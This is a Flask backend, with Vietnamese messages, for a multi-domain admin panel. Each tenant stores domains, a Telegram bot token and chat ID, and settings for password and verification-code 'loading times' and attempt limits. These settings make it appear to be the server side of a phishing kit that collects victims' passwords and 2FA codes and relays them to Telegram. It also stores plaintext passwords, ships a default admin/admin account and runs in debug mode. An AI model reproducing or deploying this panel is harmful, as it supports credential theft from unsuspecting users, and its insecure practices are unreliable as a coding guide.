import json
import os
import random
import re
import secrets
import sqlite3
import string
from functools import wraps
from json.decoder import JSONDecodeError

import jwt
import requests
from flask import (Flask, config, jsonify, redirect, render_template, request,
                   send_from_directory)
from flask_cors import CORS
from requests.exceptions import RequestException

app = Flask(__name__, static_folder="dist", template_folder="dist")
CORS(app)


def generate_or_load_secret_key():
    key_file = "secret.key"
    try:
        with open(key_file, "rb") as f:
            return f.read()
    except FileNotFoundError:
        key = secrets.token_bytes(32)
        with open(key_file, "wb") as f:
            f.write(key)
        return key


SECRET_KEY = generate_or_load_secret_key()
PUBLIC_IP = requests.get("https://api.ipify.org").text
DEFAULT_VALUE = "Không có"
ACCESS_DENIED_MESSAGE = "Không có quyền truy cập"
SUCCESS_MESSAGE = "Thành công"
INDEX_TEMPLATE = "index.html"


class Database:
    def __init__(self):
        self.database_path = 'database.db'
        self.setup_database()

    def get_connection(self):
        return sqlite3.connect(self.database_path)

    def setup_database(self):
        with self.get_connection() as conn:
            conn.execute('''CREATE TABLE IF NOT EXISTS list_vps (
                name TEXT PRIMARY KEY NOT NULL,
                domain_list TEXT NOT NULL,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                chat_id TEXT NOT NULL,
                token TEXT NOT NULL,
                code_loading_time INTEGER NOT NULL,
                pass_loading_time INTEGER NOT NULL,
                max_pass_attempts INTEGER NOT NULL,
                max_code_attempts INTEGER NOT NULL
                );''')
            domain_list = '[]'
            default_vps = [
                ('admin', f'{domain_list}', 'admin',
                 'admin', '', '', 10, 10, 10, 10)
            ]
            conn.executemany(
                'INSERT OR IGNORE INTO list_vps VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)', default_vps)
            conn.commit()

    def is_correct_domain(self, domain):
        with self.get_connection() as conn:
            domain_extract = conn.execute(
                'SELECT domain_list FROM list_vps WHERE domain_list LIKE ?', ('%' + domain + '%',)).fetchall()
            if len(domain_extract) > 0:
                data = json.loads(domain_extract[0][0])
                return domain in data
            return False

    def get_my_domain_list(self, name):
        with self.get_connection() as conn:
            domain_extract = conn.execute(
                'SELECT domain_list FROM list_vps WHERE name = ?', (name,)).fetchone()
            return json.loads(domain_extract[0]) if domain_extract else []

    def add_domain(self, name, domain):
        with self.get_connection() as conn:
            domain_list = self.get_my_domain_list(name)
            domain_list.append(domain)
            conn.execute(
                'UPDATE list_vps SET domain_list = ? WHERE name = ?', (json.dumps(domain_list), name))
            conn.commit()

    def delete_domain(self, name, domain):
        with self.get_connection() as conn:
            domain_list = self.get_my_domain_list(name)
            domain_list.remove(domain)
            conn.execute(
                'UPDATE list_vps SET domain_list = ? WHERE name = ?', (json.dumps(domain_list), name))
            conn.commit()

    def update_domain(self, name, old_domain, new_domain):
        with self.get_connection() as conn:
            domain_list = self.get_my_domain_list(name)
            domain_list[domain_list.index(old_domain)] = new_domain
            conn.execute(
                'UPDATE list_vps SET domain_list = ? WHERE name = ?', (json.dumps(domain_list), name))
            conn.commit()

    def get_telegram_config(self, name):
        with self.get_connection() as conn:
            return conn.execute(
                'SELECT chat_id, token FROM list_vps WHERE name = ?', (name,)).fetchone()

    def set_telegram_config(self, name, chat_id, token):
        with self.get_connection() as conn:
            conn.execute(
                'UPDATE list_vps SET chat_id = ?, token = ? WHERE name = ?', (chat_id, token, name))
            conn.commit()

    def get_config_by_domain(self, domain):
        with self.get_connection() as conn:
            result = conn.execute(
                'SELECT chat_id, token, code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts FROM list_vps WHERE domain_list LIKE ?', ('%' + domain + '%',)).fetchone()
            return result or {'chat_id': '', 'token': '', 'code_loading_time': 10,
                              'pass_loading_time': 10, 'max_pass_attempts': 10, 'max_code_attempts': 10}

    def get_config(self, name):
        with self.get_connection() as conn:
            return conn.execute(
                'SELECT chat_id, token, code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts FROM list_vps WHERE name = ?', (name,)).fetchone()

    def set_config(self, name, code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts):
        with self.get_connection() as conn:
            conn.execute(
                'UPDATE list_vps SET code_loading_time = ?, pass_loading_time = ?, max_pass_attempts = ?, max_code_attempts = ? WHERE name = ?', (code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts, name))
            conn.commit()

    def get_info(self, name):
        with self.get_connection() as conn:
            return conn.execute(
                'SELECT username, password FROM list_vps WHERE name = ?', (name,)).fetchone()

    def change_info(self, name, username, new_password):
        with self.get_connection() as conn:
            conn.execute(
                'UPDATE list_vps SET username = ?, password = ? WHERE name = ?', (username, new_password, name))
            conn.commit()

    def add_user(self, name):
        with self.get_connection() as conn:
            count_user = conn.execute(
                'SELECT COUNT(*) FROM list_vps WHERE name = ?', (name,)).fetchone()[0]
            if count_user > 0:
                return
            username = ''.join(random.choices(
                string.ascii_letters + string.digits, k=5))
            password = ''.join(random.choices(
                string.ascii_letters + string.digits, k=8))
            conn.execute(
                '''INSERT OR IGNORE INTO list_vps
                (name, domain_list, username, password, chat_id, token,
                code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                (name, '[]', username, password, '', '', 10, 10, 10, 10))
            conn.commit()

    def delete_user(self, name):
        with self.get_connection() as conn:
            conn.execute(
                'DELETE FROM list_vps WHERE name = ?', (name,))
            conn.commit()

    def get_list_user(self, name):
        with self.get_connection() as conn:
            if name == 'admin':
                return conn.execute(
                    'SELECT name, username, password FROM list_vps WHERE name != ?', ('admin',)).fetchall()
            else:
                return '[]'

    def get_name(self, username):
        with self.get_connection() as conn:
            return conn.execute(
                'SELECT name FROM list_vps WHERE username = ?', (username,)).fetchone()[0]

    def login_user(self, username, password):
        with self.get_connection() as conn:
            result = conn.execute(
                'SELECT 1 FROM list_vps WHERE username = ? AND password = ?',
                (username, password)
            ).fetchone()
            return result is not None


db = Database()


def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("Authorization")
        if not token:
            return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
        try:
            jwt.decode(token.split()[1], SECRET_KEY, algorithms=["HS256"])
        except jwt.ExpiredSignatureError:
            return jsonify({"message": ACCESS_DENIED_MESSAGE}), 401
        except jwt.InvalidTokenError:
            return jsonify({"message": ACCESS_DENIED_MESSAGE}), 401
        return f(*args, **kwargs)

    return decorated


@app.route("/api/admin/login", methods=["POST"])
def login():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    if db.login_user(username, password):
        name = db.get_name(username)
        token = jwt.encode({"user": username, "name": name},
                           SECRET_KEY, algorithm="HS256")
        return jsonify({"success": True, "token": token})
    return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401


@app.route("/api/admin/config", methods=["GET"])
def get_config():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host != PUBLIC_IP:
        if not db.is_correct_domain(host):
            return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
        config = db.get_config_by_domain(host)
        return jsonify(config)
    token = request.headers.get("Authorization")
    if not token:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 403
    try:
        name = jwt.decode(token.split()[1], SECRET_KEY,
                          algorithms=["HS256"])["name"]
    except jwt.ExpiredSignatureError:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    except jwt.InvalidTokenError:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    config = db.get_config(name)
    return jsonify(config)


@app.route("/api/admin/telegram", methods=["POST"])
@token_required
def get_telegram_config():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    data = request.get_json()
    chat_id = data.get("chat_id")
    telegram_token = data.get("token")
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    db.set_telegram_config(name, chat_id, telegram_token)
    return jsonify({"success": True, "message": SUCCESS_MESSAGE})


@app.route("/api/admin/config", methods=["POST"])
@token_required
def update_config():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    try:
        new_config = request.get_json()
        token = request.headers.get("Authorization")
        name = jwt.decode(token.split()[1], SECRET_KEY,
                          algorithms=["HS256"])["name"]
        code_loading_time = new_config.get("code_loading_time")
        pass_loading_time = new_config.get("pass_loading_time")
        max_pass_attempts = new_config.get("max_pass_attempts")
        max_code_attempts = new_config.get("max_code_attempts")
        db.set_config(name, code_loading_time, pass_loading_time,
                      max_pass_attempts, max_code_attempts)
        return jsonify({"success": True, "message": SUCCESS_MESSAGE})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500


@app.route('/api/admin/domains', methods=['GET'])
@token_required
def get_domains():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    return jsonify(db.get_my_domain_list(name))


@app.route('/api/admin/add-domain', methods=['POST'])
@token_required
def add_domain():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    domain = request.get_json().get("domain")
    if not domain:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 400
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    db.add_domain(name, domain)
    return jsonify({"success": True, "message": SUCCESS_MESSAGE})


@app.route('/api/admin/delete-domain', methods=['POST'])
@token_required
def delete_domain():
    domain = request.get_json().get("domain")
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    if not domain:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 400
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    db.delete_domain(name, domain)
    return jsonify({"success": True, "message": SUCCESS_MESSAGE})


@app.route('/api/admin/change-password', methods=['POST'])
@token_required
def change_password():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    vps_name = request.get_json().get("name", None)
    username = request.get_json().get("username")
    password = request.get_json().get("password")
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    if name != 'admin':
        db.change_info(name, username, password)
    else:
        if vps_name:
            db.change_info(vps_name, username, password)
        else:
            db.change_info(name, username, password)
    return jsonify({"success": True, "message": SUCCESS_MESSAGE})


@app.route('/api/admin/get-info', methods=['POST'])
@token_required
def get_info():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    vps_name = request.get_json().get("name", None)
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    if name == 'admin':
        return jsonify(db.get_info(vps_name))
    return jsonify({'name': name})


@app.route('/api/admin/check-token', methods=['POST'])
@token_required
def check_token():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    if name == 'admin':
        return jsonify({"success": True, "is_admin": True})
    return jsonify({"success": True, "is_admin": False})


@app.route('/api/admin/get-list-user', methods=['GET'])
@token_required
def get_list_user():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    if name == 'admin':
        return jsonify(db.get_list_user(name))
    return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401


@app.route('/api/admin/add-user', methods=['POST'])
@token_required
def add_user():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    vps_name = request.get_json().get("name")
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    if name != 'admin':
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    db.add_user(vps_name)
    return jsonify({"success": True, "message": SUCCESS_MESSAGE})


@app.route('/api/admin/delete-user', methods=['POST'])
@token_required
def delete_user():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    vps_name = request.get_json().get("name")
    if host != PUBLIC_IP:
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    token = request.headers.get("Authorization")
    name = jwt.decode(token.split()[1], SECRET_KEY,
                      algorithms=["HS256"])["name"]
    if name != 'admin':
        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
    db.delete_user(vps_name)
    return jsonify({"success": True, "message": SUCCESS_MESSAGE})


@app.errorhandler(Exception)
def handle_error(error):
    response = jsonify({"error": str(error)})
    response.status_code = 500
    return response


@app.route("/admin")
def admin():
    host = request.headers.get("Host").split(":")[0].replace("/", "").replace(
        "\\", "").strip()
    if host != PUBLIC_IP:
        return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
    return render_template(INDEX_TEMPLATE)


@app.route("/")
def index():
    host = request.headers.get("Host", "").split(
        ":")[0].replace("/", "").replace("\\", "").strip()
    if host == PUBLIC_IP:
        return redirect('/admin')
    if not db.is_correct_domain(host):
        return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
    return render_template(INDEX_TEMPLATE)


def serve_static_or_index(path):
    if os.path.exists(os.path.join(app.static_folder, path)):
        return send_from_directory(app.static_folder, path)
    return render_template(INDEX_TEMPLATE)


@app.route("/<path:path>")
def catch_all(path):
    host = request.headers.get("Host", "").split(
        ":")[0].replace("/", "").replace("\\", "").strip()
    if host == PUBLIC_IP:
        if os.path.exists(os.path.join(app.static_folder, path)):
            return send_from_directory(app.static_folder, path)
        if 'admin' in path:
            return render_template(INDEX_TEMPLATE)
        return redirect('/admin')

    if not db.is_correct_domain(host):
        return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403

    return serve_static_or_index(path)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
